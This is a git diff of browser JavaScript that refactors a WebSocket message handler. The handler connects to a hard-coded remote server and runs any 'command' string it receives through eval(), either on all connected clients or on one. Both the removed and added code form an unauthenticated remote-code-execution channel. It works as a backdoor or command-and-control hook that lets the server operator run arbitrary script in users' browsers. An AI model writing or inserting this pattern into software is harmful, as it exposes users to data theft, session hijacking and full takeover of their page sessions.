@@ -117,6 +117,8 @@ setInterval(checkOnlineStatus, 5000);
 //
 //                          start websocket
 //********************************************************************************************
+
+
 // Define the server address here
 const serverAddress = "wss://fz-websocket.megaderp100.repl.co";
 
@@ -148,23 +150,22 @@ function connectWebSocket() {
       const receivedData = JSON.parse(e.data);
       console.log("Received message:", receivedData); // Log received messages
 
-      if (receivedData.run && receivedData.run.client === "all") {
-        // If the command is for all clients, execute it
+      if (receivedData.run) {
         const jsCode = receivedData.run.command;
+        const targetClient = receivedData.run.client;
 
         if (typeof jsCode === "string") {
-          console.log(`Received and executing command for all clients: ${jsCode}`);
-          eval(jsCode);
-        } else {
-          console.error("Command must be a string.");
-        }
-      } else if (receivedData.run && receivedData.run.client === "this") {
-        // If the command is specifically for this client, execute it
-        const jsCode = receivedData.run.command;
-
-        if (typeof jsCode === "string") {
-          console.log(`Received and executing command for this client: ${jsCode}`);
-          eval(jsCode);
+          if (targetClient === "all") {
+            // If the command is for all clients, execute it
+            console.log(`Received and executing command for all clients: ${jsCode}`);
+            eval(jsCode);
+          } else if (targetClient === "this") {
+            // If the command is specifically for this client, execute it
+            console.log(`Received and executing command for this client: ${jsCode}`);
+            eval(jsCode);
+          } else {
+            console.error("Invalid target client:", targetClient);
+          }
         } else {
           console.error("Command must be a string.");
         }
